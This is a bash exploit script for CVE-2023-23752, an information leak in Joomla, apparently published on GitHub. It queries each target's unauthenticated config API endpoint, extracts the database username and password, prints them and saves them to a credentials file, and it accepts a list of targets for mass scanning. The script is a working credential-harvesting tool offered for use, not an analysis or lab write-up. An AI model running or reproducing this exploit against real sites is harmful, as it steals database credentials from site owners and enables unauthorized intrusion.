#!/bin/bash

banners() {
    echo -e "\e[38;5;201m███████╗ █████╗  ██████╗ ██╗     ███████╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗  ██████╗██████╗ ███████╗██╗    ██╗\e[0m"
    echo -e "\e[38;5;201m██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║    ██║\e[0m"
    echo -e "\e[38;5;201m█████╗  ███████║██║  ███╗██║     █████╗  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║     ██████╔╝█████╗  ██║ █╗ ██║\e[0m"
    echo -e "\e[38;5;201m██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║     ██╔══██╗██╔══╝  ██║███╗██║\e[0m"
    echo -e "\e[38;5;201m███████╗██║  ██║╚██████╔╝███████╗███████╗╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚██████╗██║  ██║███████╗╚███╔███╔╝\e[0m"
    echo -e "\e[38;5;201m╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝\e[0m"
    echo -e "\e[33m═════════════╦══════════════════════════════════════════╦\e[0m"
    echo -e "\e[33m══════════════════════|═════════════════════════════════|\e[0m"
    echo -e "\e[33m| • \e[91mAUTHOR\e[0m            \e[33m|   \e[35m0xWhoami35\e[0m                    \e[33m|"
    echo -e "\e[33m| • \e[91mGITHUB\e[0m         \e[33m   |   \e[35mhttps://github.com/0xWhoami35\e[0m \e[33m|"
    echo -e "\e[33m|═════════════════════|═════════════════════════════════|\e[0m"
}

if [ ! -d "Results" ]; then
    mkdir "Results"
fi

banners

if [[ $1 == "-u" ]]; then
    url=$2
    if [[ ! $url =~ ^https?:// ]]; then
        full_url="http://$url"
    else
        full_url="$url"
    fi

    echo -e "\e[32m[CVE-2023-23752] - $url .: [Scanning!]\e[0m"
    response=$(curl -sSfk "$full_url/api/index.php/v1/config/application?public=true")

    user=$(echo "$response" | grep -o '"user":"[^"]*' | cut -d'"' -f4)
    password=$(echo "$response" | grep -o '"password":"[^"]*' | cut -d'"' -f4)

    if [[ -n $user && -n $password ]]; then
        echo -e "\n[+] Domain            : $url"
        echo -e "\e[91m[+] Username          : $user\e[0m"
        echo -e "\e[91m[+] Password          : $password\e[0m\n"

        echo -e "[+] $url\nUsername          : $user\nPassword          : $password\n" >> Results/Credentials.txt
    else
        echo "[CVE-2023-23752] - $url .: [Failed!]"
    fi
elif [[ $1 == "-t" ]]; then
    url_file=$2
    while IFS= read -r url; do
        url=$(echo "$url" | tr -d '\r')
        if [[ ! $url =~ ^https?:// ]]; then
            url="http://$url"
        fi

        echo -e "\e[32m[CVE-2023-23752] - $url .: [Scanning!]\e[0m"
        response=$(curl -sSfk "$url/api/index.php/v1/config/application?public=true")

        user=$(echo "$response" | grep -o '"user":"[^"]*' | cut -d'"' -f4)
        password=$(echo "$response" | grep -o '"password":"[^"]*' | cut -d'"' -f4)

        if [[ -n $user && -n $password ]]; then
            echo -e "\n[+] Domain            : $url"
            echo -e "\e[91m[+] Username          : $user\e[0m"
            echo -e "\e[91m[+] Password          : $password\e[0m\n"

            echo -e "[+] $url\nUsername          : $user\nPassword          : $password\n" >> Results/Credentials.txt
        else
            echo "[CVE-2023-23752] - $url .: [Failed!]"
        fi
    done < "$url_file"
else
    echo "usage: exploit.sh [-h] [-u URL] [-t TARGETS]

CVE-2023-23752 - Authentication Bypass Information Leak on Joomla!

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Single URL to scan
  -t TARGETS, --targets TARGETS
                        File containing multiple URLs to scan"
fi
